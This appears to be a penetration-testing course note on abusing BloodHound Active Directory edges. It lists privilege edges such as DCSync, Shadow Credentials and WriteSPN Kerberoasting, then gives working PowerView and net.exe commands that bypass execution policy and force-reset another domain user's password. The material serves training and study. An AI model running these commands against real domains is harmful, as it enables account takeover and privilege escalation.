# 04.03 BloodHound Edges Abuse

> Right-click any BloodHound edge for ready-to-paste exploitation commands — chain ForceChangePassword → CanRDP as the canonical example.

## Overview

Edges represent privileges and relationships between nodes. Each edge has built-in Abuse Info (right-click → edge) showing exactly how to exploit it. The general workflow: identify the edge in pathfinding → right-click for abuse instructions → execute using PowerView/net.exe/SharpView → chain edges toward the target. The ForceChangePassword→CanRDP chain is the introductory example in the course.

## Steps

- **ForceChangePassword** → change target user's password without knowing the current one (Set-DomainUserPassword or `net user`).
- **CanRDP / CanPSRemote / ExecuteDCOM** → remote execution rights on a computer.
- **AdminTo** → local administrator on the target computer.
- **AddMembers / AddSelf** → add arbitrary users (or yourself) to a group.
- **DCSync** → replicate AD secrets (GetChanges + GetChangesAll on domain object).
- **GenericAll / GenericWrite / WriteDacl / WriteOwner / Owns** → various ACE-based full or partial control.
- **AllowedToDelegate** → constrained delegation; add service principal to S4U2Proxy abuse.
- **AddKeyCredentialLink** → write msDS-KeyCredentialLink → Shadow Credentials attack.
- **ReadLAPSPassword / ReadGMSAPassword / SyncLAPSPassword** → credential access.
- **WriteSPN** → add SPN to user → Kerberoast the account.
- **HasSIDHistory** → SID history contains privileged SID → privilege escalation.

## Commands

### ForceChangePassword → CanRDP chain (PowerView)

```powershell
PS C:\htb> Set-ExecutionPolicy Bypass -Force
PS C:\htb> Import-Module C:\tools\PowerView.ps1

# Create PSCredential for the controlling user (grace):
PS C:\htb> $SecPassword = ConvertTo-SecureString 'Password11' -AsPlainText -Force
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\grace', $SecPassword)

# Set new password on target user (rosy):
PS C:\htb> $UserPassword = ConvertTo-SecureString 'NewRossyCreds!' -AsPlainText -Force
PS C:\htb> Set-DomainUserPassword -Identity rosy -AccountPassword $UserPassword -Credential $Cred -Verbose

# Alternative (net.exe):
net user rosy NewRossyCreds! /domain
```
